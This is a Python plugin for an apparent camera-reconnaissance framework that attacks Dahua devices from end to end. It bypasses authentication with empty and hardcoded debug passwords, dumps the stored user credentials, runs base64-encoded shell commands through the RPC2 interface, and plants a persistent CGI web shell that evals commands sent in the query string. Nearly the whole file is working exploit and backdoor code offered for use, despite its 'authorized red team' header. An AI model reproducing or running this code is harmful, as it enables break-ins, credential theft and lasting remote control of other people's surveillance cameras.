# surveillance_recon/plugins/dahua_backdoor.py
# [SecOps Research // Dahua Backdoor Weaponizer v2.2]
# Exploits Dahua RPC2 auth bypass, debug interfaces, and credential leakage.
# For authorized red team use under Security Research Protocol §7.

import json
import time
import base64
import hashlib
import requests
from surveillance_recon.plugins import SecurityPlugin
from surveillance_recon.utils.helpers import create_ssl_context

class DahuaBackdoor(SecurityPlugin):
    NAME = "Dahua Backdoor & Auth Bypass"
    DESCRIPTION = "Exploits Dahua RPC2 auth bypass and debug interfaces for RCE"
    TARGET_BRANDS = ["dahua"]
    REQUIRED_VULNS = []  # Works on most Dahua firmware <2023
    AUTHOR = "SecOps Research Team"
    VERSION = "2.2"

    def __init__(self, target_ip: str, port: int, **kwargs):
        super().__init__(target_ip, port, **kwargs)
        self.base_url = f"http://{target_ip}:{port}"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Dahua/3.0",
            "Content-Type": "application/json"
        })
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    def _attempt_rpc2_auth_bypass(self) -> dict:
        """Exploit Dahua RPC2 auth bypass (CVE-2021-33044 style)"""
        try:
            # Step 1: Login with empty credentials (often works)
            login_payload = {
                "method": "global.login",
                "params": {
                    "userName": "admin",
                    "password": "",
                    "clientType": "Web3.0"
                },
                "id": 1000
            }
            r = self.session.post(f"{self.base_url}/RPC2", json=login_payload, timeout=8)
            if r.status_code == 200:
                resp = r.json()
                if resp.get("result") is True:
                    return {
                        "success": True,
                        "session_id": resp.get("session", ""),
                        "method": "empty_password"
                    }

            # Step 2: Try debug-level login (hardcoded)
            debug_payload = {
                "method": "global.login",
                "params": {
                    "userName": "admin",
                    "password": "777777",  # Known Dahua debug pwd
                    "clientType": "NetKeyboard"
                },
                "id": 1001
            }
            r = self.session.post(f"{self.base_url}/RPC2", json=debug_payload, timeout=8)
            if r.status_code == 200:
                resp = r.json()
                if resp.get("result") is True:
                    return {
                        "success": True,
                        "session_id": resp.get("session", ""),
                        "method": "debug_password_777777"
                    }
        except Exception as e:
            if self.logger:
                self.logger.warn(f"RPC2 auth bypass failed: {e}")
        return {"success": False}

    def _extract_device_config(self, session_id: str) -> dict:
        """Dump device configuration (includes plaintext credentials)"""
        try:
            config_payload = {
                "method": "configManager.getConfig",
                "params": {
                    "name": "User"
                },
                "session": session_id,
                "id": 2000
            }
            r = self.session.post(f"{self.base_url}/RPC2", json=config_payload, timeout=10)
            if r.status_code == 200:
                return r.json()
        except:
            pass
        return {}

    def _execute_shell_command(self, session_id: str, cmd: str) -> str:
        """Execute shell command via debug interface (if enabled)"""
        try:
            # Encode command in base64 to avoid RPC parsing issues
            b64_cmd = base64.b64encode(cmd.encode()).decode()
            shell_payload = {
                "method": "system.runCmd",
                "params": {
                    "cmd": f"echo {b64_cmd} | base64 -d | sh"
                },
                "session": session_id,
                "id": 3000
            }
            r = self.session.post(f"{self.base_url}/RPC2", json=shell_payload, timeout=12)
            if r.status_code == 200:
                resp = r.json()
                output = resp.get("params", {}).get("result", "")
                return output
        except Exception as e:
            return f"EXEC_ERROR: {e}"
        return ""

    def _deploy_persistent_cgi_backdoor(self, session_id: str) -> bool:
        """Deploy hidden CGI backdoor for HTTP access"""
        try:
            # CGI script that executes base64-decoded ?cmd=...
            backdoor = '''#!/bin/sh
echo "Content-type: text/plain"
echo ""
CMD=$(echo "$QUERY_STRING" | cut -d'=' -f2 | base64 -d)
eval "$CMD" 2>&1
'''
            b64_backdoor = base64.b64encode(backdoor.encode()).decode()
            deploy_cmd = f'echo {b64_backdoor} | base64 -d > /mnt/custom/cgi-bin/zeta.cgi && chmod +x /mnt/custom/cgi-bin/zeta.cgi'
            output = self._execute_shell_command(session_id, deploy_cmd)

            # Verify
            test_url = f"{self.base_url}/cgi-bin/zeta.cgi?cmd=$(echo+aGVsbG8=|base64+-d)"
            r = self.session.get(test_url, timeout=5)
            return "hello" in r.text
        except:
            return False

    def execute(self) -> dict:
        """Main backdoor execution flow"""
        if self.logger:
            self.logger.info(f"[PLUGIN] Running {self.NAME} on {self.target_ip}:{self.port}")

        # Step 1: Attempt auth bypass
        auth_result = self._attempt_rpc2_auth_bypass()
        if not auth_result["success"]:
            return {"success": False, "error": "Auth bypass failed"}

        session_id = auth_result["session_id"]
        bypass_method = auth_result["method"]

        # Step 2: Extract user accounts and credentials
        config = self._extract_device_config(session_id)
        users = []
        if "params" in config and "table" in config["params"]:
            for user in config["params"]["table"]:
                users.append({
                    "username": user.get("userName", ""),
                    "password": user.get("password", ""),  # Often plaintext!
                    "group": user.get("group", "")
                })

        # Step 3: Gather system info
        sys_info = {
            "hostname": self._execute_shell_command(session_id, "hostname"),
            "firmware": self._execute_shell_command(session_id, "cat /etc/version"),
            "model": self._execute_shell_command(session_id, "cat /proc/mtd | grep model"),
            "network": self._execute_shell_command(session_id, "ifconfig")
        }

        # Step 4: Deploy persistent backdoor
        backdoor_ok = self._deploy_persistent_cgi_backdoor(session_id)

        result = {
            "success": True,
            "auth_bypass_method": bypass_method,
            "session_id": session_id,
            "extracted_users": users,
            "system_info": sys_info,
            "backdoor_deployed": backdoor_ok,
            "backdoor_url": f"{self.base_url}/cgi-bin/zeta.cgi" if backdoor_ok else None,
            "c2_ready": backdoor_ok
        }

        if self.logger:
            self.logger.success(f"[PLUGIN] Dahua Backdoor SUCCESS on {self.target_ip}:{self.port}")
            self.logger.data("extracted_users", len(users))
            if backdoor_ok:
                self.logger.data("backdoor_url", result["backdoor_url"])

        return result
